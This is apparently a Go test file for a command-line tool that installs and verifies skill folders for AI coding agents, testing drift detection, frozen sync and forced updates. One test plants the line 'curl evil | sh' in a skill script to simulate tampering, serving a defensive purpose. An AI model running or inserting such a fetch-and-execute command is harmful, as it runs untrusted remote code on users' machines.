package commands

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/hasankhatib/hikma-ai/internal/lock"
)

func TestVerifyReportsDrift(t *testing.T) {
	reg := registryRepo(t)
	proj := project(t)
	if out, err := run(t, "skill", "install", reg, "alpha", "--agent", "claude,codex"); err != nil {
		t.Fatalf("install: %v\n%s", err, out)
	}

	out, err := run(t, "skill", "verify")
	if err != nil || !strings.Contains(out, "2 skill(s) checked, 0 differ") {
		t.Fatalf("clean verify: %v\n%s", err, out)
	}

	write(t, filepath.Join(proj, ".claude", "skills", "alpha", "scripts", "run.sh"), "curl evil | sh\n")
	write(t, filepath.Join(proj, ".claude", "skills", "alpha", "extra.md"), "x\n")
	out, err = run(t, "skill", "verify")
	if err == nil {
		t.Fatalf("expected drift to fail:\n%s", out)
	}
	for _, want := range []string{"FAIL  .claude/skills/alpha", "modified scripts/run.sh", "added    extra.md", "scripts/ differ", "ok    .agents/skills/alpha", "2 skill(s) checked, 1 differ"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}

	// Naming a skill limits the check to its folders.
	if out, err := run(t, "skill", "verify", "alpha", "--agent", "codex"); err != nil || !strings.Contains(out, "1 skill(s) checked, 0 differ") {
		t.Fatalf("scoped verify: %v\n%s", err, out)
	}
	if _, err := run(t, "skill", "verify", "nope"); err == nil {
		t.Fatal("unknown skill accepted")
	}
}

func TestVerifyMissingFolder(t *testing.T) {
	reg := registryRepo(t)
	proj := project(t)
	if _, err := run(t, "skill", "install", reg, "alpha", "--agent", "claude"); err != nil {
		t.Fatal(err)
	}
	if err := os.RemoveAll(filepath.Join(proj, ".claude")); err != nil {
		t.Fatal(err)
	}
	out, err := run(t, "skill", "verify")
	if err == nil || !strings.Contains(out, "the folder is missing") {
		t.Fatalf("err = %v\n%s", err, out)
	}
}

func TestSyncFrozenRefusesDriftAndChangesNothing(t *testing.T) {
	reg := registryRepo(t)
	proj := project(t)
	if _, err := run(t, "skill", "install", reg, "alpha", "--agent", "claude,codex"); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(proj, ".claude", "skills", "alpha", "SKILL.md"), "edited\n")
	if err := os.RemoveAll(filepath.Join(proj, ".agents")); err != nil {
		t.Fatal(err)
	}

	out, err := run(t, "sync", "--frozen", "--yes")
	if err == nil || !strings.Contains(err.Error(), "frozen") || !strings.Contains(out, "drift") {
		t.Fatalf("expected frozen failure: %v\n%s", err, out)
	}
	if exists(filepath.Join(proj, ".agents", "skills", "alpha")) {
		t.Fatal("frozen sync restored something even though it failed")
	}

	// Without drift it restores like a normal sync.
	write(t, filepath.Join(proj, ".claude", "skills", "alpha", "SKILL.md"), strings.NewReplacer("%s", "alpha").Replace(skillMD))
	out, err = run(t, "sync", "--frozen", "--yes")
	if err != nil || !exists(filepath.Join(proj, ".agents", "skills", "alpha", "SKILL.md")) {
		t.Fatalf("frozen sync without drift: %v\n%s", err, out)
	}
}

func TestFrozenProblemsRequirePinnedCommits(t *testing.T) {
	unpinned := lock.Entry{Name: "x", Source: "owner/repo", Files: map[string]string{}}
	pinned := lock.Entry{Name: "x", Source: "owner/repo", Commit: "abc1234", Files: map[string]string{}}
	local := lock.Entry{Name: "x", Source: t.TempDir(), Files: map[string]string{}}

	items := []syncItem{
		{key: ".claude/skills/a", entry: unpinned, state: syncRestore},
		{key: ".claude/skills/b", entry: pinned, state: syncRestore},
		{key: ".claude/skills/c", entry: local, state: syncRestore},
		{key: ".claude/skills/d", entry: unpinned, state: syncOK},
	}
	got := frozenProblems(items, false)
	if len(got) != 1 || !strings.Contains(got[0], ".claude/skills/a") || !strings.Contains(got[0], "not pinned") {
		t.Fatalf("problems = %v", got)
	}
}

func TestUpdateForceRestoresLocalEditsWhenUpstreamIsUnchanged(t *testing.T) {
	reg := registryRepo(t)
	proj := project(t)
	if _, err := run(t, "skill", "install", reg, "alpha", "--agent", "claude"); err != nil {
		t.Fatal(err)
	}
	local := filepath.Join(proj, ".claude", "skills", "alpha", "SKILL.md")
	write(t, local, "edited\n")

	if out, err := run(t, "skill", "update", "alpha", "--agent", "claude"); err == nil {
		t.Fatalf("a local edit should block the update:\n%s", out)
	}
	out, err := run(t, "skill", "update", "alpha", "--agent", "claude", "--force")
	if err != nil || !strings.Contains(out, "local changes overwritten") {
		t.Fatalf("--force: %v\n%s", err, out)
	}
	if b, _ := os.ReadFile(local); string(b) == "edited\n" {
		t.Fatal("--force left the local edit in place")
	}
	if out, err := run(t, "skill", "verify"); err != nil {
		t.Fatalf("verify after restore: %v\n%s", err, out)
	}
}
